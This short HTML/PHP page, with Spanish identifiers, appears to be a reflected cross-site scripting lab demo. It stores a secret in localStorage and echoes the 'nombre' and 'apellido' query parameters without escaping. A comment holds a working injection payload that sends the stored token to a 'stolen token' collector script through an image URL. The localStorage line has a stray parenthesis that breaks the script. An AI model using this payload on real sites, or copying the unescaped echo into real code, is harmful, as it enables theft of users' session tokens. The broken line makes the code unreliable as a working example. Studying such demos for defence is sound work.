<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>XSS</title>
    </head>
    <body>
        <script type="text/javascript">
            // localstorage
            localStorage.misecreto = "mimasintimosecreto");
        </script>
        <h1>Guardado el secreto</h1>
        <?php
            $nombre = $_GET['nombre'];
            $apellido = $_GET['apellido'];
            echo $nombre.$apellido;
        ?>
        <!--
            document.write("<img src='http://localhost/guardartokenrobado.php?token="+localStorage.misecreto+"'>");void("");

            &nombre=<script>document.write("<img src='http://localhost/guardartokenrobado.php?token="+localStorage.misecreto+"'>");void("&apellido=");</script>
        -->
    </body>
</html>
